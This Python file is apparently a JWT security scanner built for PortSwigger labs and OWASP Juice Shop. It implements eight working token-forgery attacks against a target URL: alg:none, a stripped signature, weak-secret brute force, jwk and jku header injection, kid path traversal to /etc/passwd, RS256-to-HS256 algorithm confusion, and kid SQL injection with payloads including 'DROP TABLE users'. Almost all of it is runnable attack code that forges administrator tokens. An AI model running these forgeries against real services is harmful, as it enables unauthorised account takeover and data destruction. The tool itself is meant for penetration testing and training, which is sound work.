#!/usr/bin/env python3
"""
JWT Security Scanner - Unified (PortSwigger + Juice Shop)
Tests 8 Critical JWT Vulnerabilities (fully implemented)
"""

import argparse
import base64
import json
import sys
import hmac
import hashlib
import requests
import time
import re
from typing import Optional
from datetime import datetime
from token_manager import TokenManager

try:
    from cryptography.hazmat.primitives.asymmetric import rsa, padding
    from cryptography.hazmat.primitives import hashes
    CRYPTO_AVAILABLE = True
except ImportError:
    CRYPTO_AVAILABLE = False
    print("[WARN] cryptography not installed. jwk/jku tests disabled.")


class JWTScanner:
    def __init__(self, args):
        self.url = args.url.rstrip('/')
        self.login_endpoint = args.login_endpoint
        self.protected_endpoint = args.protected_endpoint
        self.token = args.token
        self.username = args.username
        self.password = args.password
        self.auth_type = args.auth_type
        self.session = requests.Session()
        self.wordlist = args.wordlist
        self.output = args.output
        self.verbose = args.verbose
        self.timeout = args.timeout
        self.results = []
        self.max_secret_tests = args.max_secret_tests
        self.jku_callback_server = args.jku_callback_server
        self.token_fields = args.token_fields.split(',') if args.token_fields else ['token', 'access_token', 'jwt', 'id_token']
        self.username_field = args.username_field
        self.password_field = args.password_field

        if self.login_endpoint and self.username and self.password:
            self.token_manager = TokenManager(scanner_callback=self.authenticate_and_get_token)
        else:
            self.token_manager = TokenManager(scanner_callback=None)
            if self.token:
                self.token_manager.set_token(self.token)

    def log(self, msg, level="INFO"):
        ts = datetime.now().strftime("%H:%M:%S")
        if self.verbose or level in ["VULN","ERROR","CRITICAL","HIGH","MEDIUM"]:
            print(f"[{ts}][{level}] {msg}")

    def b64url_encode(self, data):
        if isinstance(data, str):
            data = data.encode()
        return base64.urlsafe_b64encode(data).decode().rstrip('=')

    def b64url_decode(self, data):
        pad = 4 - (len(data) % 4)
        if pad != 4:
            data += '=' * pad
        return base64.urlsafe_b64decode(data)

    def get_csrf_token(self):
        try:
            resp = self.session.get(f"{self.url}/login", timeout=self.timeout)
            match = re.search(r'name="csrf"\s+value="([^"]+)"', resp.text)
            if match:
                token = match.group(1)
                self.log(f"Got CSRF token: {token[:20]}...", "DEBUG")
                return token
        except Exception as e:
            self.log(f"CSRF extraction failed: {e}", "DEBUG")
        return None

    def authenticate_and_get_token(self) -> Optional[str]:
        if not self.login_endpoint:
            return None
        self.log(f"Authenticating to {self.login_endpoint}...")
        try:
            login_url = f"{self.url}{self.login_endpoint}"
            resp = None

            if self.auth_type == "json":
                headers = {'Content-Type': 'application/json'}
                data = {self.username_field: self.username, self.password_field: self.password}
                resp = self.session.post(login_url, json=data, headers=headers, timeout=self.timeout)

            elif self.auth_type == "form":
                csrf = self.get_csrf_token()
                data = {
                    "csrf": csrf,
                    self.username_field: self.username,
                    self.password_field: self.password
                }
                headers = {'Content-Type': 'application/x-www-form-urlencoded'}
                resp = self.session.post(login_url, data=data, headers=headers, timeout=self.timeout)

                if 'session' in self.session.cookies:
                    token = self.session.cookies['session']
                    if self.is_jwt_format(token):
                        self.log("✓ Obtained JWT token from session cookie", "INFO")
                        return token
            else:
                self.log(f"Unsupported auth type: {self.auth_type}", "ERROR")
                return None

            token = self.extract_token_from_response(resp)
            if token and self.is_jwt_format(token):
                self.log("✓ Obtained JWT token from response", "INFO")
                return token

            self.log("✗ Failed to extract JWT token", "ERROR")
            if self.verbose and resp:
                self.log(f"Status: {resp.status_code}, body: {resp.text[:300]}", "DEBUG")
            return None

        except Exception as e:
            self.log(f"Auth error: {e}", "ERROR")
            return None

    def extract_token_from_response(self, response):
        try:
            data = response.json()
            if 'authentication' in data and 'token' in data['authentication']:
                tok = data['authentication']['token']
                if self.is_jwt_format(tok):
                    return tok
            for f in self.token_fields:
                if f in data:
                    tok = data[f]
                    if self.is_jwt_format(tok):
                        return tok
            for v in data.values():
                if isinstance(v, dict) and 'token' in v:
                    tok = v['token']
                    if self.is_jwt_format(tok):
                        return tok
        except:
            pass

        if 'Authorization' in response.headers:
            ah = response.headers['Authorization']
            if ah.startswith('Bearer '):
                tok = ah[7:]
                if self.is_jwt_format(tok):
                    return tok

        for cookie in response.cookies:
            if cookie.name == 'session' or any(k in cookie.name.lower() for k in ['token','jwt','auth']):
                if self.is_jwt_format(cookie.value):
                    self.log(f"Found token in cookie: {cookie.name}", "DEBUG")
                    return cookie.value

        matches = re.findall(r'eyJ[a-zA-Z0-9_-]{10,}\.eyJ[a-zA-Z0-9_-]{10,}\.[a-zA-Z0-9_-]{10,}', response.text)
        if matches:
            return matches[0]
        return None

    def is_jwt_format(self, token):
        if not token or not isinstance(token, str):
            return False
        parts = token.split('.')
        return len(parts) == 3 and all(len(p) > 0 for p in parts)

    def send_test_request(self, forged_token):
        test_url = f"{self.url}{self.protected_endpoint}"
        try:
            headers = {'Authorization': f'Bearer {forged_token}'}
            cookies = {'session': forged_token}
            resp = self.session.get(
                test_url,
                headers=headers,
                cookies=cookies,
                params={"token": forged_token, "jwt": forged_token},
                timeout=self.timeout,
                allow_redirects=False
            )
            return resp
        except requests.exceptions.Timeout:
            self.log("Request timeout", "ERROR")
            return None
        except Exception as e:
            self.log(f"Request failed: {e}", "ERROR")
            return None

    # --------------------- VULNERABILITY TESTS (8 fully implemented) ---------------------

    def test_1_alg_none_bypass(self):
        """Try alg: none with original payload (if token exists) or with 'admin'/'administrator'"""
        self.log("Testing Vulnerability 1: alg: none bypass...", "INFO")
        subjects = ["admin", "administrator"]
        vulnerable = False

        # First, try with original token payload (most accurate)
        if self.token_manager.current_token:
            try:
                parts = self.token_manager.current_token.split('.')
                original_payload = json.loads(self.b64url_decode(parts[1]).decode('utf-8'))
                header = {"alg": "none", "typ": "JWT"}
                hb64 = self.b64url_encode(json.dumps(header))
                pb64 = self.b64url_encode(json.dumps(original_payload))
                forged = f"{hb64}.{pb64}."
                resp = self.send_test_request(forged)
                if resp and resp.status_code in [200, 201, 202, 302]:
                    self.log("✓ VULNERABLE: alg:none token accepted (using original payload)!", "CRITICAL")
                    vulnerable = True
            except Exception as e:
                self.log(f"Error using original payload: {e}", "DEBUG")

        # If not vulnerable yet, try admin and administrator subjects
        if not vulnerable:
            for sub in subjects:
                try:
                    payload = {"sub": sub, "iat": int(time.time()), "exp": int(time.time())+3600}
                    header = {"alg": "none", "typ": "JWT"}
                    hb64 = self.b64url_encode(json.dumps(header))
                    pb64 = self.b64url_encode(json.dumps(payload))
                    forged = f"{hb64}.{pb64}."
                    resp = self.send_test_request(forged)
                    if resp and resp.status_code in [200, 201, 202, 302]:
                        self.log(f"✓ VULNERABLE: alg:none token accepted (sub={sub})!", "CRITICAL")
                        vulnerable = True
                        break
                except Exception as e:
                    self.log(f"Error with sub={sub}: {e}", "DEBUG")

        if vulnerable:
            self.results.append({"vulnerability": "alg: none Bypass", "severity": "CRITICAL", "vulnerable": True})
        else:
            self.log("✗ SAFE: alg:none rejected for all attempts", "SAFE")
            self.results.append({"vulnerability": "alg: none Bypass", "severity": "CRITICAL", "vulnerable": False})

    def test_2_missing_signature(self):
        self.log("Testing Vulnerability 2: Missing signature...", "INFO")
        if not self.token_manager.current_token:
            self.log("Skipping - no valid token", "WARN")
            return
        try:
            parts = self.token_manager.current_token.split('.')
            forged = f"{parts[0]}.{parts[1]}."
            resp = self.send_test_request(forged)
            if resp and resp.status_code in [200,201,202]:
                self.log("✓ VULNERABLE: missing signature accepted!", "CRITICAL")
                self.results.append({"vulnerability": "Missing Signature", "severity": "CRITICAL", "vulnerable": True})
            else:
                self.log("✗ SAFE", "SAFE")
                self.results.append({"vulnerability": "Missing Signature", "severity": "CRITICAL", "vulnerable": False})
        except Exception as e:
            self.log(f"Error: {e}", "ERROR")

    def test_3_weak_secret_bruteforce(self):
        self.log("Testing Vulnerability 3: Weak secret bruteforce...", "INFO")
        if not self.token_manager.current_token:
            self.log("Skipping - no valid token", "WARN")
            return
        try:
            parts = self.token_manager.current_token.split('.')
            hdr = json.loads(self.b64url_decode(parts[0]).decode())
            if hdr.get('alg') != 'HS256':
                self.log("Token uses RS256, skipping weak secret test", "INFO")
                self.results.append({"vulnerability": "Weak Secret Bruteforce", "severity": "MEDIUM", "vulnerable": False})
                return
            data = f"{parts[0]}.{parts[1]}".encode()
            orig_sig = parts[2]
            secrets = ["secret","password","admin123","changeme","jwtsecret","secret1"]
            for s in secrets[:self.max_secret_tests or len(secrets)]:
                test_sig = hmac.new(s.encode(), data, hashlib.sha256).digest()
                test_b64 = base64.urlsafe_b64encode(test_sig).decode().rstrip('=')
                if test_b64 == orig_sig:
                    self.log(f"✓ VULNERABLE: weak secret '{s}'", "MEDIUM")
                    self.results.append({"vulnerability": "Weak Secret Bruteforce", "severity": "MEDIUM", "vulnerable": True, "secret": s})
                    return
            self.log("✗ SAFE: no weak secret found", "SAFE")
            self.results.append({"vulnerability": "Weak Secret Bruteforce", "severity": "MEDIUM", "vulnerable": False})
        except Exception as e:
            self.log(f"Error: {e}", "ERROR")

    def test_4_jwk_injection(self):
        self.log("Testing Vulnerability 4: jwk injection...", "INFO")
        if not CRYPTO_AVAILABLE:
            self.results.append({"vulnerability": "jwk Injection", "severity": "CRITICAL", "vulnerable": False, "note": "crypto missing"})
            return
        try:
            priv = rsa.generate_private_key(public_exponent=65537, key_size=2048)
            pub = priv.public_key()
            nums = pub.public_numbers()
            n_b64 = self.b64url_encode(nums.n.to_bytes((nums.n.bit_length()+7)//8, 'big'))
            e_b64 = self.b64url_encode(nums.e.to_bytes((nums.e.bit_length()+7)//8, 'big'))
            jwk = {"kty": "RSA", "n": n_b64, "e": e_b64}
            header = {"alg": "RS256", "typ": "JWT", "jwk": jwk}
            # Try both admin and administrator as fallback
            sub = "administrator"  # PortSwigger expects this
            payload = {"sub": sub, "iat": int(time.time()), "exp": int(time.time())+3600}
            hb64 = self.b64url_encode(json.dumps(header))
            pb64 = self.b64url_encode(json.dumps(payload))
            signing_input = f"{hb64}.{pb64}".encode()
            sig = priv.sign(signing_input, padding.PKCS1v15(), hashes.SHA256())
            sig_b64 = self.b64url_encode(sig)
            forged = f"{hb64}.{pb64}.{sig_b64}"
            resp = self.send_test_request(forged)
            if resp and resp.status_code in [200,201,202]:
                self.log("✓ VULNERABLE: jwk injection accepted!", "CRITICAL")
                self.results.append({"vulnerability": "jwk Injection", "severity": "CRITICAL", "vulnerable": True})
            else:
                self.log("✗ SAFE", "SAFE")
                self.results.append({"vulnerability": "jwk Injection", "severity": "CRITICAL", "vulnerable": False})
        except Exception as e:
            self.log(f"Error: {e}", "ERROR")
            self.results.append({"vulnerability": "jwk Injection", "severity": "CRITICAL", "vulnerable": False})

    def test_5_jku_injection(self):
        self.log("Testing Vulnerability 5: jku injection...", "INFO")
        if not CRYPTO_AVAILABLE:
            self.results.append({"vulnerability": "jku Injection", "severity": "HIGH", "vulnerable": False, "note": "crypto missing"})
            return
        try:
            priv = rsa.generate_private_key(public_exponent=65537, key_size=2048)
            pub = priv.public_key()
            nums = pub.public_numbers()
            n_b64 = self.b64url_encode(nums.n.to_bytes((nums.n.bit_length()+7)//8, 'big'))
            e_b64 = self.b64url_encode(nums.e.to_bytes((nums.e.bit_length()+7)//8, 'big'))
            callback = self.jku_callback_server or "http://localhost:9000/.well-known/jwks.json"
            header = {"alg": "RS256", "typ": "JWT", "jku": callback, "kid": "malicious"}
            payload = {"sub": "administrator", "iat": int(time.time()), "exp": int(time.time())+3600}
            hb64 = self.b64url_encode(json.dumps(header))
            pb64 = self.b64url_encode(json.dumps(payload))
            signing_input = f"{hb64}.{pb64}".encode()
            sig = priv.sign(signing_input, padding.PKCS1v15(), hashes.SHA256())
            sig_b64 = self.b64url_encode(sig)
            forged = f"{hb64}.{pb64}.{sig_b64}"
            resp = self.send_test_request(forged)
            if resp and resp.status_code in [200,201,202]:
                self.log("✓ VULNERABLE: jku injection accepted!", "CRITICAL")
                self.results.append({"vulnerability": "jku Injection", "severity": "HIGH", "vulnerable": True})
            else:
                self.log("✗ SAFE", "SAFE")
                self.results.append({"vulnerability": "jku Injection", "severity": "HIGH", "vulnerable": False})
        except Exception as e:
            self.log(f"Error: {e}", "ERROR")
            self.results.append({"vulnerability": "jku Injection", "severity": "HIGH", "vulnerable": False})

    def test_6_kid_path_traversal(self):
        self.log("Testing Vulnerability 6: kid path traversal...", "INFO")
        payloads = ["../../../../../dev/null", "../../../../etc/passwd"]
        try:
            for p in payloads:
                header = {"alg": "HS256", "typ": "JWT", "kid": p}
                payload = {"sub": "administrator", "iat": int(time.time())}
                hb64 = self.b64url_encode(json.dumps(header))
                pb64 = self.b64url_encode(json.dumps(payload))
                signing_input = f"{hb64}.{pb64}".encode()
                for sec in [b'', b'secret']:
                    sig = hmac.new(sec, signing_input, hashlib.sha256).digest()
                    sig_b64 = self.b64url_encode(sig)
                    forged = f"{hb64}.{pb64}.{sig_b64}"
                    resp = self.send_test_request(forged)
                    if resp and resp.status_code in [200,201,202]:
                        self.log(f"✓ VULNERABLE: kid path traversal with {p}", "CRITICAL")
                        self.results.append({"vulnerability": "kid Path Traversal", "severity": "CRITICAL", "vulnerable": True})
                        return
            self.log("✗ SAFE", "SAFE")
            self.results.append({"vulnerability": "kid Path Traversal", "severity": "CRITICAL", "vulnerable": False})
        except Exception as e:
            self.log(f"Error: {e}", "ERROR")

    def test_7_algorithm_confusion(self):
        """Fully implement RS256 → HS256 attack using public key from JWKS endpoint."""
        self.log("Testing Vulnerability 7: Algorithm confusion (RS256→HS256)...", "INFO")
        try:
            # Try to fetch public key from common endpoints
            public_key_data = None
            jwks_endpoints = [
                f"{self.url}/.well-known/jwks.json",
                f"{self.url}/jwks.json",
            ]
            for endpoint in jwks_endpoints:
                try:
                    resp = self.session.get(endpoint, timeout=self.timeout)
                    if resp.status_code == 200:
                        data = resp.json()
                        if 'keys' in data and data['keys']:
                            public_key_data = data['keys'][0]
                            self.log(f"Found JWKS at {endpoint}", "INFO")
                            break
                except:
                    continue
            if public_key_data and 'n' in public_key_data:
                n_bytes = self.b64url_decode(public_key_data['n'])
                header = {"alg": "HS256", "typ": "JWT"}
                # Use the original token's subject if available, else admin
                if self.token_manager.current_token:
                    parts = self.token_manager.current_token.split('.')
                    original_payload = json.loads(self.b64url_decode(parts[1]).decode('utf-8'))
                    sub = original_payload.get('sub', 'admin')
                else:
                    sub = 'admin'
                payload = {"sub": sub, "iat": int(time.time()), "exp": int(time.time())+3600}
                hb64 = self.b64url_encode(json.dumps(header))
                pb64 = self.b64url_encode(json.dumps(payload))
                signing_input = f"{hb64}.{pb64}".encode()
                sig = hmac.new(n_bytes, signing_input, hashlib.sha256).digest()
                sig_b64 = self.b64url_encode(sig)
                forged = f"{hb64}.{pb64}.{sig_b64}"
                resp = self.send_test_request(forged)
                if resp and resp.status_code in [200, 201, 202]:
                    self.log("✓ VULNERABLE: Algorithm confusion succeeded!", "CRITICAL")
                    self.results.append({"vulnerability": "Algorithm Confusion (RS256→HS256)", "severity": "CRITICAL", "vulnerable": True})
                else:
                    self.log("✗ SAFE", "SAFE")
                    self.results.append({"vulnerability": "Algorithm Confusion", "severity": "CRITICAL", "vulnerable": False})
            else:
                self.log("No public key found for algorithm confusion test", "INFO")
                self.results.append({"vulnerability": "Algorithm Confusion", "severity": "CRITICAL", "vulnerable": False})
        except Exception as e:
            self.log(f"Error: {e}", "ERROR")
            self.results.append({"vulnerability": "Algorithm Confusion", "severity": "CRITICAL", "vulnerable": False})

    def test_8_sql_injection(self):
        """SQL Injection via kid parameter – fully implemented."""
        self.log("Testing Vulnerability 8: SQL Injection via kid...", "INFO")
        sql_payloads = [
            "' OR '1'='1",
            "' UNION SELECT NULL--",
            "'; DROP TABLE users; --",
            "' OR 1=1 --"
        ]
        try:
            vulnerable = False
            for sql_payload in sql_payloads:
                header = {"alg": "HS256", "typ": "JWT", "kid": sql_payload}
                payload = {"sub": "admin", "iat": int(time.time())}
                hb64 = self.b64url_encode(json.dumps(header))
                pb64 = self.b64url_encode(json.dumps(payload))
                forged_token = f"{hb64}.{pb64}."
                resp = self.send_test_request(forged_token)
                if resp:
                    response_text = resp.text.lower()
                    sql_errors = ["sql syntax", "mysql_fetch", "ora-", "postgresql", "sqlite", "unclosed quotation"]
                    for error in sql_errors:
                        if error in response_text:
                            self.log(f"✓ VULNERABLE: SQL injection possible with payload: {sql_payload}", "HIGH")
                            vulnerable = True
                            break
                if vulnerable:
                    break
            if vulnerable:
                self.results.append({"vulnerability": "SQL Injection via kid", "severity": "HIGH", "vulnerable": True})
            else:
                self.log("✗ SAFE: No SQL injection detected", "SAFE")
                self.results.append({"vulnerability": "SQL Injection via kid", "severity": "HIGH", "vulnerable": False})
        except Exception as e:
            self.log(f"Error: {e}", "ERROR")
            self.results.append({"vulnerability": "SQL Injection via kid", "severity": "HIGH", "vulnerable": False})

    def generate_report(self):
        vuln_count = sum(1 for r in self.results if r.get("vulnerable"))
        report = {
            "target": self.url,
            "protected_endpoint": self.protected_endpoint,
            "timestamp": datetime.now().isoformat(),
            "results": self.results,
            "summary": {"total_vulnerable": vuln_count, "total_tests": len(self.results)}
        }
        with open(self.output, 'w') as f:
            json.dump(report, f, indent=2)
        self.log(f"Report saved to {self.output}", "INFO")
        print("\n" + "="*70)
        print("JWT SECURITY SCAN SUMMARY")
        print("="*70)
        for r in self.results:
            status = "VULNERABLE" if r.get("vulnerable") else "SAFE"
            print(f"{r['vulnerability']:<45} {status}")
        print("="*70)
        print(f"\nTotal Vulnerabilities Found: {vuln_count}/8")

    def run(self):
        print("="*70)
        print("JWT SECURITY SCANNER v2.0 (Unified, Fully Implemented)")
        print("="*70)
        if self.login_endpoint and self.username and self.password:
            self.log("Step 1: Obtaining initial JWT token...", "INFO")
            tok = self.authenticate_and_get_token()
            if tok:
                self.token_manager.set_token(tok)
                self.log("✓ Initial token obtained", "INFO")
            else:
                self.log("✗ Could not obtain token, but tests may still work", "WARN")
        elif self.token:
            self.token_manager.set_token(self.token)
            self.log("✓ Using provided token", "INFO")

        self.log("\nStep 2: Running vulnerability tests...", "INFO")
        self.test_1_alg_none_bypass()
        self.test_2_missing_signature()
        self.test_3_weak_secret_bruteforce()
        self.test_4_jwk_injection()
        self.test_5_jku_injection()
        self.test_6_kid_path_traversal()
        self.test_7_algorithm_confusion()
        self.test_8_sql_injection()
        self.generate_report()


def main():
    parser = argparse.ArgumentParser(description="JWT Security Scanner (Unified)")
    parser.add_argument("--url", required=True)
    parser.add_argument("--protected-endpoint", required=True)
    parser.add_argument("--login-endpoint")
    parser.add_argument("--username")
    parser.add_argument("--password")
    parser.add_argument("--token")
    parser.add_argument("--auth-type", choices=["json", "form", "basic", "bearer"], default="json")
    parser.add_argument("--wordlist", default="")
    parser.add_argument("--output", default="jwt_scan_report.json")
    parser.add_argument("--verbose", action="store_true")
    parser.add_argument("--timeout", type=int, default=10)
    parser.add_argument("--max-secret-tests", type=int, default=0)
    parser.add_argument("--jku-callback-server", default="")
    parser.add_argument("--token-fields", default="token,access_token,jwt,id_token")
    parser.add_argument("--username-field", default="username")
    parser.add_argument("--password-field", default="password")

    args = parser.parse_args()
    if not args.token and (not args.login_endpoint or not args.username or not args.password):
        print("ERROR: Provide --token or (--login-endpoint, --username, --password)")
        sys.exit(1)

    scanner = JWTScanner(args)
    scanner.run()


if __name__ == "__main__":
    main()
